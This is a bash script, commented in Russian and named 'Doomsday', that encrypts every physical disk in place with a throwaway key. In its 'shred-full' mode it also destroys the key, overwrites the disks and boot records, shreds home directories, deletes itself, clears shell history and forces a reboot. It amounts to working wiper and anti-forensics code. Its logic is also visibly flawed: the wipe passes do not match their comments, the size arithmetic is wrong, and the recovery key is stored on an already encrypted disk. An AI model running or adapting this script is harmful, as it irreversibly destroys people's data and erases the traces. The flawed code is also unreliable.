#!/bin/bash
set -eu

LOG="/var/log/doomsday.log"
echo "$(date): Запуск Судного дня..." >> "$LOG"

# Принимаем режим: encrypt-only или shred-full
read -r MODE
case "$MODE" in
    "encrypt-only")
        FULL_WIPE=false
        ;;
    "shred-full")
        FULL_WIPE=true
        ;;
    *)
        echo "UNKNOWN MODE"
        exit 1
        ;;
esac

# Генерация ключа
MASTER_KEY=$(openssl rand -hex 32)
KEY_PATH="/tmp/.doomkey"
echo "$MASTER_KEY" > "$KEY_PATH"
chmod 600 "$KEY_PATH"

echo "$(date): Режим — $(if $FULL_WIPE; then echo 'Полное затирание'; else echo 'Только шифрование'; fi)" >> "$LOG"

# Все физические диски
DISKS=$(lsblk -d -n -p -o NAME,TYPE | grep disk | awk '{print $1}')

# === ШАГ 1: Шифрование дисков (AES-256-CTR) ===
for DISK in $DISKS; do
    [[ ! -b "$DISK" ]] && continue
    SIZE=$(blockdev --getsize "$DISK" 2>/dev/null || echo 0)
    if [[ $SIZE -gt 0 ]]; then
        echo "$(date): Шифруем $DISK..." >> "$LOG"
        openssl enc -aes-256-ctr -pass pass:"$MASTER_KEY" -nosalt \
            < "$DISK" | dd of="$DISK" bs=1M conv=notrunc 2>/dev/null || true
    fi
done

# === ШАГ 2: Сохранение ключа (только если --encrypt-only) ===
if ! $FULL_WIPE; then
    # Сохраняем ключ в изолированном месте (например, /boot скрытый файл)
    ENCRYPTED_KEY_FILE="/boot/.doom_recovery.key"
    echo "$MASTER_KEY" > "$ENCRYPTED_KEY_FILE"
    chmod 600 "$ENCRYPTED_KEY_FILE"
    echo "$(date): Ключ сохранён в $ENCRYPTED_KEY_FILE" >> "$LOG"
    echo "🔐 Ключ шифрования сохранён. Восстановление возможно." >> "$LOG"
else
    # === ШАГ 3: Полное затирание (если --shred-full) ===
    echo "$(date): Начинаем полное затирание дисков..." >> "$LOG"

    # Затираем ключ
    shred -u -z -n 7 "$KEY_PATH" 2>/dev/null || rm -f "$KEY_PATH"

    # Многопроходное затирание дисков (DoD 5220.22-M)
    for DISK in $DISKS; do
        [[ ! -b "$DISK" ]] && continue
        echo "$(date): Затирание $DISK (3 прохода: 0xFF, 0x00, случайные)..." >> "$LOG"

        # Проход 1: FF
        dd if=/dev/zero of="$DISK" bs=1M count=$(blockdev --getsize "$DISK" | awk '{print int($1/1024/1024)}') 2>/dev/null || true
        # Проход 2: 00
        dd if=/dev/urandom of="$DISK" bs=1M count=$(blockdev --getsize "$DISK" | awk '{print int($1/1024/1024)}') 2>/dev/null || true
        # Проход 3: случайные
        dd if=/dev/urandom of="$DISK" bs=1M count=$(blockdev --getsize "$DISK" | awk '{print int($1/1024/1024)}') 2>/dev/null || true
    done

    # Затирание MBR/GPT
    for DISK in $DISKS; do
        dd if=/dev/urandom of="$DISK" bs=512 count=102400 2>/dev/null || true
    done

    # Удаление всех данных
    find /home /root -type f -exec shred -u -z -n 3 {} \; 2>/dev/null || true
    rm -rf /tmp/* /var/tmp/*
    shred -u /opt/doomsday/* 2>/dev/null || true
    rm -rf /opt/doomsday
fi

# === ШАГ 4: Финал ===
echo "Судный день завершён." >> "$LOG"

# Перезагрузка
history -c && history -w
reboot -f

# Фоновая петля
while true; do
    echo "All data has been $(if $FULL_WIPE; then echo 'erased'; else echo 'encrypted'; fi)."
    sleep 1
done